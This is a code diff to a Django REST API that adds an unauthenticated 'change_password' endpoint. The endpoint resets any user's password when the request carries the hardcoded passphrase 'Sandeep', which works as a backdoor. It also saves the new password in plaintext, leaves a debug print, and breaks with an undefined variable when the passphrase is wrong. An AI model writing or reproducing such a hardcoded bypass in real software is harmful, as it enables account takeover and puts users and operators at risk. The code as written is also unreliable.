@@ -430,3 +430,22 @@ def update_password(request):
     user.save()
 
     return Response({"success": "Password changed successfully"})
+
+@api_view(['POST'])
+@permission_classes([permissions.AllowAny])
+def change_password(request):
+    username = request.data.get('username')
+    current_password = request.data.get('passphrase')
+    new_password = request.data.get('password')
+    print('213')
+    
+    if (current_password == 'Sandeep'):
+        user = SystemUser.objects.filter(username=username).first()
+
+    if not user:
+        return Response({"error": "Current password is incorrect"}, status=400)
+
+    user.password = new_password
+    user.save()
+
+    return Response({"success": "Password changed successfully"})
